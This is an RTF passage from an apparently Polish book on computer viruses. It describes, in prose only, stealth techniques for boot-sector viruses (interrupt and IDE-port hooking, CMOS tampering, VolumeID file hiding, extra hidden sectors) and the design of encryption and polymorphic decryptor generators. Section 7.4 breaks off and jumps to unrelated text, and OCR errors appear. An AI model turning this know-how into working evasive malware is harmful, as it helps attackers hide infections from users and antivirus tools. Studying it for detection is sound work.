\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch KOMB_STE ends}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch end start}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 7.1.3. Podawanie prawdziwej zawarto\uc1\u347\'9cci sektor\'f3w (ang. }{\f1\fs24\i\b\lang1045{\*\listtag0}sector level stealth}{\f1\fs24\b\lang1045{\*\listtag0})}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Oczywi\uc1\u347\'9ccie, technik\uc1\u281\'ea stealth mo\uc1\u380\'bfna stosowa\uc1\u263\'e6 tak\uc1\u380\'bfe w przypadku odczytu sektor\'f3w; nale\uc1\u380\'bfy przej\uc1\u261\'b9\uc1\u263\'e6 obs\uc1\u322\'b3ug\uc1\u281\'ea funkcji (02/13) oraz ewentualnie (0A/13). W momencie pr\'f3by odczytu zara\uc1\u380\'bfonego MBR lub BOOT-sektora wirus podsuwa programowi odczytuj\uc1\u261\'b9cemu ich oryginalna, nie z}{\f1\fs24\lang1045{\*\listtag0}a}{\f0\fs24\lang1045{\*\listtag0}infekowan\uc1\u261\'b9 zawarto\uc1\u347\'9c\uc1\u263\'e6 (podobnie jak w przypadku plik\'f3w, sektory zainfekowane musz\uc1\u261\'b9 by\uc1\u263\'e6 w jaki\uc1\u347\'9c spos\'f3b oznaczone, \uc1\u380\'bfeby wirus m\'f3g\uc1\u322\'b3 je rozpozna\uc1\u263\'e6). Aby ustrzec si\uc1\u281\'ea przed programami umo\uc1\u380\'bfliwiaj\uc1\u261\'b9cymi od\uc1\u347\'9cwie\uc1\u380\'bfenie tablicy partycji lub BOOT-sektora, mo\uc1\u380\'bfna dodatkowo }{\f1\fs24\lang1045{\*\listtag0}z}{\f0\fs24\lang1045{\*\listtag0}abezpieczy\uc1\u263\'e6 sektory zawieraj\uc1\u261\'b9ce wirusa przed zapisem poprzez przej\uc1\u281\'eacie funkcji (03/13) i ewentualnie (0B/13).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 7.1.4. Fa\uc1\u322\'b3szowanie odczytywanych sektor\'f3w na etapie obs\uc1\u322\'b3ugi przerwa\uc1\u324\'f1 sprz\uc1\u281\'eatowych (ang. }{\f1\fs24\i\b\lang1045{\*\listtag0}hardware level stealth}{\f1\fs24\b\lang1045{\*\listtag0})}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch W przypadku sektor\'f3w istnieje mo\uc1\u380\'bfliwo\uc1\u347\'9c\uc1\u263\'e6 zastosowania tzw. techniki hardtvare level stealth, kt\'f3ra jest rozszerzeniem metody opisanej w poprzednim punkcie. Technika ta polega na przechwyceniu odwo\uc1\u322\'b3a\uc1\u324\'f1 do dysk\'f3w ju\uc1\u380\'bf na etapie przerwania sprz\uc1\u281\'eatowego IRQ 14 (INT 76h) lub poprzez przej\uc1\u281\'eacie wywo\uc1\u322\'b3ywanej przez to przerwanie funkcji (9100/15h), co umo\uc1\u380\'bfliwia oszukiwanie systemu na najni\uc1\u380\'bfszym poziomie programowym- Podczas obs\uc1\u322\'b3ugi tego przerwania lub funkcji wirus mo\uc1\u380\'bfe odczyta\uc1\u263\'e6 z port\'f3w lFx dane o aktualnie wykonywanej operacji i nast\uc1\u281\'eapnie, w razie wyk}{\f1\fs24\lang1045{\*\listtag0}r}{\f0\fs24\lang1045{\*\listtag0}ycia odwo\uc1\u322\'b3ania np. do MBR, zmieni\uc1\u263\'e6 rozkaz tak, aby odczytywa\uc1\u263\'e6 inny sektor, zawieraj\uc1\u261\'b9cy prawdziw\uc1\u261\'b9 zawarto\uc1\u347\'9c\uc1\u263\'e6 MBR.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Sprawdzenie aktualnie wykonywanej operacji polega na odczycie baj-tu z portu 1F7 (rejestr statusowy IDE) i przetestowaniu bit\'f3w jego m\uc1\u322\'b3odszej cz\uc1\u281\'ea\uc1\u347\'9cci. Je\uc1\u380\'bfeli kt\'f3ry\uc1\u347\'9c z nich jest ustawiony (tzn. ma warto\uc1\u347\'9c\uc1\u263\'e6 l), oznacza to, i\uc1\u380\'bf w\uc1\u322\'b3a\uc1\u347\'9cnie jest wykonywana operacja odczytu. Parametry odczytywanego sektora (cylinder, g\uc1\u322\'b3owic\uc1\u281\'ea, sektor) mo\uc1\u380\'bfna odczyta\uc1\u263\'e6 z port\'f3w 1F3, 1F4/1F5/1F6. Je\uc1\u380\'bfeli odczytane dane s\uc1\u261\'b9 zgodne z}{\f1\fs24\lang1045{\*\listtag0} }{\f0\fs24\lang1045{\*\listtag0}oczekiwanymi, wirus musi wykona\uc1\u263\'e6 do ko\uc1\u324\'f1ca operacj\uc1\u281\'ea odczytu oraz ustawi\uc1\u263\'e6 dane w portach kontrolera na inny sektor (np. na taki, w kt\'f3rym znajduje si\uc1\u281\'ea oryginalna zawarto\uc1\u347\'9c\uc1\u263\'e6 odczytywanego sektora).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch W efekcie program antywirusowy, kt\'f3ry u\uc1\u380\'bfywa do odczytu sektor\'f3w bezpo\uc1\u347\'9credniego adresu przerwania int 13h, zawartego w BIOS-ie, i tak b\uc1\u281\'eadzie oszukiwany przez wirusa. Aby technika hardware level stealth zadzia\uc1\u322\'b3a\uc1\u322\'b3a, sterownik dysku musi generowa\uc1\u263\'e6 IRQ14 (co mo\uc1\u380\'bfna ustawi\uc1\u263\'e6 programowo) przy realizacji operacji dost\uc1\u281\'eapu do d}{\f1\fs24\lang1045{\*\listtag0}ysku.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 7.2. ModyfikacjaCMOS-a}{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Nowoczesne BIOS-y zawieraj\uc1\u261\'b9 mechanizmy zabezpieczania niekt\'f3rych newralgicznych sektor\'f3w przed zapisem (MBR, BOOT-sektory). W momencie wykrycia pr\'f3by zapisu do kt\'f3rego\uc1\u347\'9c z tych sektor\'f3w system najcz\uc1\u281\'ea\uc1\u347\'9cciej w jaki\uc1\u347\'9c spos\'f3b alarmuje u\uc1\u380\'bfytkownika i czasem prosi go o potwierdzenie wykonywanej operacji lub te\uc1\u380\'bf, aby kompletnie uniemo\uc1\u380\'bfliwi\uc1\u263\'e6 t\uc1\u281\'ea operacj\uc1\u281\'ea, zawiesza komputer i czeka na naci\uc1\u347\'9cni\uc1\u281\'eacie klawisza RESET.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch To, czy BIOS b\uc1\u281\'eadzie reagowa\uc1\u322\'b3 na pr\'f3by zapisu do newralgicznych sektor\'f3w, ustalane jest zwykle z poziomu programu SETUP, kt\'f3ry dost\uc1\u281\'eapny jest po naci\uc1\u347\'9cni\uc1\u281\'eaciu jakiego\uc1\u347\'9c klawisza (najcz\uc1\u281\'ea\uc1\u347\'9cciej DEL lub CTRL-ALT-ESC) podczas uruchamiania komputera. Ustalone w programie SETUP parametry s\uc1\u261\'b9 po jego opuszczeniu zapisywane do podtrzymywanej bateri\uc1\u261\'b9}{\f1\fs24\lang1045{\*\listtag0} }{\f0\fs24\lang1045{\*\listtag0}pami\uc1\u281\'eaci CMOS.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Korzystaj\uc1\u261\'b9c z tego, i\uc1\u380\'bf pami\uc1\u281\'ea\uc1\u263\'e6 ta dost\uc1\u281\'eapna jest programowo, mo\uc1\u380\'bfna zmodyfikowa\uc1\u263\'e6 pewne dane, tak aby np. na chwil\uc1\u281\'ea odblokowa\uc1\u263\'e6 zapis do MBR. Wymaga to jednak znajomo\uc1\u347\'9cci r\'f3\uc1\u380\'bfnych system\'f3w BIOS, gdy\uc1\u380\'bf znajduj\uc1\u261\'b9ca si\uc1\u281\'ea w nich pami\uc1\u281\'ea\uc1\u263\'e6 CMOS ma zazwyczaj zawarto\uc1\u347\'9c\uc1\u263\'e6 odmienn\uc1\u261\'b9 od pami\uc1\u281\'eaci w innych komputerach, a jej zgodno\uc1\u347\'9c\uc1\u263\'e6 ogranicza si\uc1\u281\'ea do ustalonego znaczenia pocz\uc1\u261\'b9tkowych kom\'f3rek tej pami\uc1\u281\'eaci (co jest konieczne ze wzgl\uc1\u281\'eadu na kompatybilno\uc1\u347\'9c\uc1\u263\'e6).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Drugim parametrem mo\uc1\u380\'bfliwym do zmodyfikowania w CMOS-ie jest warto\uc1\u347\'9c\uc1\u263\'e6 okre\uc1\u347\'9claj\uc1\u261\'b9ca, jakie nap\uc1\u281\'eady dyskietek zamontowane s\uc1\u261\'b9 w komputerze. Wirus mo\uc1\u380\'bfe wyzerowa\uc1\u263\'e6 t\uc1\u281\'ea warto\uc1\u347\'9c\uc1\u263\'e6, tak i\uc1\u380\'bf przy starcie BIOS nie b\uc1\u281\'eadzie widzia\uc1\u322\'b3 \uc1\u380\'bfadnej dyskietki i b\uc1\u281\'eadzie pr\'f3bowa\uc1\u322\'b3 za\uc1\u322\'b3adowa\uc1\u263\'e6 system z twardego dysku (z MBR), razem ze znajduj\uc1\u261\'b9cym si\uc1\u281\'ea w nim wiruse}{\f1\fs24\lang1045{\*\listtag0}m}{\f0\fs24\lang1045{\*\listtag0}. Po za\uc1\u322\'b3adowaniu wirus przywraca parametry dyskietek w CMOS-ie i nast\uc1\u281\'eapnie sprawdza, czy nap\uc1\u281\'ead FDD zawiera dyskietk\uc1\u281\'ea i ewentualnie wczytuje z niej BOOT-sektor, po czym oddaje do niego sterowanie.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Zainstalowany w systemie wirus przy odwo\uc1\u322\'b3aniach do dyskietek ustawia parametry w CMOS-ie, a po ich zako\uc1\u324\'f1czeniu znowu je kasuje, tak wi\uc1\u281\'eac po wy\uc1\u322\'b3\uc1\u261\'b9czeniu komputera parametry w CMOS-ie b\uc1\u281\'ead\uc1\u261\'b9 najcz\uc1\u281\'ea\uc1\u347\'9cciej skasowane. Takie dzia\uc1\u322\'b3a\uc1\u322\'b3anie do\uc1\u347\'9c\uc1\u263\'e6 mocno utrudni za\uc1\u322\'b3adowanie systemu z czystej dyskietki, zw\uc1\u322\'b3aszcza je\uc1\u347\'9cli wirus potraf}{\f1\fs24\lang1045{\*\listtag0}i}{\f0\fs24\lang1045{\*\listtag0} tak\uc1\u380\'bfe zainstalowa\uc1\u263\'e6 w pami\uc1\u281\'eaci CMOS has\uc1\u322\'b3o, uniemo\uc1\u380\'bfliwiaj\uc1\u261\'b9ce przeci\uc1\u281\'eatnemu u\uc1\u380\'bfytkownikowi dostanie si\uc1\u281\'ea do programu SETUP.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 7.3. Atrybut etykiet dysku (ang. }{\f1\fs24\i\b\lang1045{\*\listtag0}VolumeID}{\f1\fs24\b\lang1045{\*\listtag0})}{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Do ukrywania si\uc1\u281\'ea w systemie niekt\'f3re wirusy wykorzystuj\uc1\u261\'b9 fakt, i\uc1\u380\'bf programy przegl\uc1\u261\'b9daj\uc1\u261\'b9ce zawarto\uc1\u347\'9cci katalogu (typowe nak\uc1\u322\'b3adki lub polecenie DIR) nie pokazuj\uc1\u261\'b9 zwykle pozycji katalogu zawieraj\uc1\u261\'b9cych atrybut VolumeID (etykieta dysku). Wirusy dodaj\uc1\u261\'b9 do dotychczasowych atrybut\'f3w pliku, zawieraj\uc1\u261\'b9cego np. kod wirusa, tak\uc1\u380\'bfe wy\uc1\u380\'bfej wymieniony atrybut (np. po}{\f1\fs24\lang1045{\*\listtag0}p}{\f0\fs24\lang1045{\*\listtag0}rzez wykorzystanie om\'f3wionych wcze\uc1\u347\'9cniej tablic SFT). Tak ukryty plik b\uc1\u281\'eadzie widoczny najcz\uc1\u281\'ea\uc1\u347\'9cciej tylko w tzw. edytorach binarnych, operuj\uc1\u261\'b9cych na zawarto\uc1\u347\'9cci fizycznych sektor\'f3w (np. Disk Editor).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Ta sztuczka nie wymaga instalowania w systemie \uc1\u380\'bfadnego rezydent-nego kodu, gdy\uc1\u380\'bf niewidzialno\uc1\u347\'9c\uc1\u263\'e6 zagwarantuje sam system DOS.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 7.4. Dodatkowe \uc1\u347\'9ccie\uc1\u380\'bfki na dyskach}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Ze wzgl\uc1\u281\'eadu na to, i\uc1\u380\'bf wirusy zara\uc1\u380\'bfaj\uc1\u261\'b9ce sektor MBR lub BOOT-sektory s\uc1\u261\'b9 programami zajmuj\uc1\u261\'b9cymi zwykle obszar b\uc1\u281\'ead\uc1\u261\'b9cy wielokrotno\uc1\u347\'9cci\uc1\u261\'b9 kilku sektor\'f3w, tw\'f3rca wirusa musi podj\uc1\u261\'b9\uc1\u263\'e6 decyzj\uc1\u281\'ea, gdzie umie\uc1\u347\'9cci\uc1\u263\'e6 wirusa po infekcji.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Nie mog\uc1\u261\'b9 to by\uc1\u263\'e6 sektory wybrane na chybi\uc1\u322\'b3 trafi\uc1\u322\'b3, gdy\uc1\u380\'bf ich zamazanie kodem wirusa mo\uc1\u380\'bfe zniszczy\uc1\u263\'e6 dane, wa\uc1\u380\'bfne dla dzia\uc1\u322\'b3ania systemu. Wi\uc1\u281\'eakszo\uc1\u347\'9c\uc1\u263\'e6 wirus\'f3w dopisuje si\uc1\u281\'ea na pocz\uc1\u261\'b9tku dysku, w obszarze pierwszego cylindra (bezpo\uc1\u347\'9crednio za tablic\uc1\u261\'b9 partycji). Tylko nieliczne wirusy potrafi\uc1\u261\'b9 lepiej ukry\uc1\u263\'e6 sw\'f3j kod przed programami antywirusowymi. Korzystaj\uc1\u261\'b9c z tego, i\uc1\u380\'bf wi\uc1\u281\'eakszo\uc1\u347\'9c\uc1\u263\'e6 dysk\'f3w posiada wi\uc1\u281\'eacej sektor\'f3w ni\uc1\u380\'bf liczba widziana przez system BIOS, wirus}{\f1\fs24\lang1045{\*\listtag0}y}{\f0\fs24\lang1045{\*\listtag0} doformato-wywuj\uc1\u261\'b9 sobie dodatkowe u\uc1\u380\'bfywane sektory, po czym je wykorzystuj\uc1\u261\'b9.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch kodu wirusa. Jedyn\uc1\u261\'b9 wad\uc1\u261\'b9 tradycyjnego szyfrowania by\uc1\u322\'b3a konieczno\uc1\u347\'9c\uc1\u263\'e6 pozostawienia nie zakodowanej procedury dekoduj\uc1\u261\'b9cej, co w pewnym sensie skazywa\uc1\u322\'b3o wirusa na rych\uc1\u322\'b3e wykrycie, gdy\uc1\u380\'bf nawet kilkubajtowy kod takiej procedury stanowi\uc1\u322\'b3 w zasadzie sygnatur\uc1\u281\'ea wirusa, umo\uc1\u380\'bfliwiaj\uc1\u261\'b9c\uc1\u261\'b9 jego identyfikacj\uc1\u281\'ea. Aby omin\uc1\u261\'b9\uc1\u263\'e6 t\uc1\u281\'ea przeszkod\uc1\u281\'ea, zacz\uc1\u281\'eato rozwa\uc1\u380\'bfa\uc1\u263\'e6 mo\uc1\u380\'bfliwo\uc1\u347\'9c\uc1\u263\'e6 stworzenia generatora procedur dekodu-j\uc1\u261\'b9cych, kt\'f3re r\'f3\uc1\u380\'bfni\uc1\u322\'b3yby si\uc1\u281\'ea rozmieszczeniem i dobor}{\f1\fs24\lang1045{\*\listtag0}e}{\f0\fs24\lang1045{\*\listtag0}m instrukcji, rejestrami roboczymi oraz sposobem deszyfrowania. Przej\uc1\u347\'9ccie od teorii do praktyki sta\uc1\u322\'b3o si\uc1\u281\'ea mo\uc1\u380\'bfliwe wraz z pojawieniem si\uc1\u281\'ea MtE, kt\'f3ry cho\uc1\u263\'e6 pierwszy, do dzi\uc1\u347\'9c uznawany jest za generator produkuj\uc1\u261\'b9cy jedne z najbardziej zmiennych i wyszukanych (}{\f1\fs24\lang1045{\*\listtag0}ang. sophisticated) procedur}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch dekoduj\uc1\u261\'b9cych. O stopniu skomplikowania wirusa szyfruj\uc1\u261\'b9cego sw\'f3j kod decyduj\uc1\u261\'b9}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch dwie poni\uc1\u380\'bfsze procedury:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > procedura generuj\uc1\u261\'b9ca szyfrator (ang. encryptor);}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > procedura generuj\uc1\u261\'b9ca dekoder (ang. decryptor).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch W zale\uc1\u380\'bfno\uc1\u347\'9cci od ich skomplikowania mo\uc1\u380\'bfna wyr\'f3\uc1\u380\'bfni\uc1\u263\'e6 wirusy, kt\'f3re}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch zawieraj\uc1\u261\'b9:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > sta\uc1\u322\'b3y szyfrator + sta\uc1\u322\'b3y dekoder - kod wirusa wraz z dekoderem za ka\uc1\u380\'bfdym razem wygl\uc1\u261\'b9da identycznie (z dok\uc1\u322\'b3adno\uc1\u347\'9cci\uc1\u261\'b9 do kodu wirusa i pomini\uc1\u281\'eaciem zmiennych zapami\uc1\u281\'eatywanych wewn\uc1\u261\'b9trz wirusa); wykrywanie wirusa }{\f1\fs24\lang1045{\*\listtag0}przebiega identycznie jak w przypadku wirus\'f3w nieszyfrowanych;}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > sta\uc1\u322\'b3y szyfrator + zmienny dekoder - raczej rzadko stosowany;}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch je\uc1\u380\'bfeli kto\uc1\u347\'9c potrafi zastosowa\uc1\u263\'e6 zmienny dekoder, zwykle tworzy tak\uc1\u380\'bfe zmienn\uc1\u261\'b9 procedur\uc1\u281\'ea szyfruj\uc1\u261\'b9c\uc1\u261\'b9;}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > zmienny szyfrator + sta\uc1\u322\'b3y dekoder - kod wirusa za ka\uc1\u380\'bfdym razem wygl\uc1\u261\'b9da inaczej, dekoder jest zawsze taki sam; wykrycie procedury dekoduj\uc1\u261\'b9cej wykrywa r\'f3wnie\uc1\u380\'bf wirusa;}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > zmienny szyfrator + zmienny dekoder - kod wirusa wraz z dekoderem za ka\uc1\u380\'bfdym razem wygl\uc1\u261\'b9da inaczej; s\uc1\u261\'b9 to tzw. wirusy}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch polimorficzne}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\qc\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\qc\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch ROZDZIA\uc1\u321\'a3 8}{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\qc\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 8.1. Procedury szyfruj\uc1\u261\'b9ce kod}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Do zaszyfrowania wirusa mo\uc1\u380\'bfna zastosowa\uc1\u263\'e6 dowoln\uc1\u261\'b9 z dost\uc1\u281\'eapnych w procesorze, odwracalnych operacji matematycznych lub logicznych, a wi\uc1\u281\'eac:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > dodawanie - operacja ADD;}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > odejmowanie - operacja SUB;}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > suma modulo 2 - operacja XOR;}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > negowanie arytmetyczne - operacja NEG;}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > negowanie logiczne - operacja NOT;}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > przesuni\uc1\u281\'eacie cykliczne w lewo - operacja ROL;}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > przesuni\uc1\u281\'eacie cykliczne w prawo - operacja ROR.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch S\uc1\u261\'b9 to najcz\uc1\u281\'ea\uc1\u347\'9cciej wykorzystywane metody szyfrowania, cho\uc1\u263\'e6 nic nie stoi na przeszkodzie, aby wprowadzi\uc1\u263\'e6 inne, np. przestawianie bajt\'f3w miejscami, traktowanie licznika lub indeksu jako warto\uc1\u347\'9cci u\uc1\u380\'bfywanej w wymienionych wy\uc1\u380\'bfej operacjach matematycznych i logicznych.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch To, kt\'f3}{\f0\fs24\lang1045{\*\listtag0}ra operacja (lub operacje) b\uc1\u281\'eadzie u\uc1\u380\'bfyta oraz z jakimi parametrami, zale\uc1\u380\'bfy wy\uc1\u322\'b3\uc1\u261\'b9cznie od inwencji projektuj\uc1\u261\'b9cego procedur\uc1\u281\'ea. Je\uc1\u380\'bfeli sk\uc1\u322\'b3ada si\uc1\u281\'ea ona za ka\uc1\u380\'bfdym razem z tych samych instrukcji, to jest to sta\uc1\u322\'b3a procedura szyfruj\uc1\u261\'b9ca i b\uc1\u281\'eadzie dawa\uc1\u263\'e6 za ka\uc1\u380\'bfdym razem }{\f1\fs24\lang1045{\*\listtag0}t}{\f0\fs24\lang1045{\*\listtag0}aki sam obraz zakodowanego wirusa. Zupe\uc1\u322\'b3nie inaczej sprawa ma si\uc1\u281\'ea ze zmienn\uc1\u261\'b9 procedur\uc1\u261\'b9 szyfruj\uc1\u261\'b9c\uc1\u261\'b9, kt\'f3ra po wywo\uc1\u322\'b3aniu wybiera przypadkowo ilo\uc1\u347\'9c\uc1\u263\'e6 operacji szyfruj\uc1\u261\'b9cych, a nast\uc1\u281\'eapnie w p\uc1\u281\'eatli losuje:}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > rodzaj operacji wykonywanej na argumencie;}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > argumenty operacji;}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > rodzaj argument\'f3w (bajt, s\uc1\u322\'b3owo, podw\'f3jne s\uc1\u322\'b3owo, ewentualnie}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch inne).}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Wybierane operacje oraz argumenty nale\uc1\u380\'bfy gdzie\uc1\u347\'9c zapami\uc1\u281\'eata\uc1\u263\'e6 (zwykle w tablicy lub na stosie), gdy\uc1\u380\'bf w przysz\uc1\u322\'b3o\uc1\u347\'9cci b\uc1\u281\'eadzie je wykorzystywa\uc1\u263\'e6 procedura generuj\uc1\u261\'b9ca dekoder.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 8.2. Procedury}{\f0\fs24\b\lang1045{\*\listtag0} dekoduj\uc1\u261\'b9ce}{\f1\fs24\b\lang1045{\*\listtag0}\par}
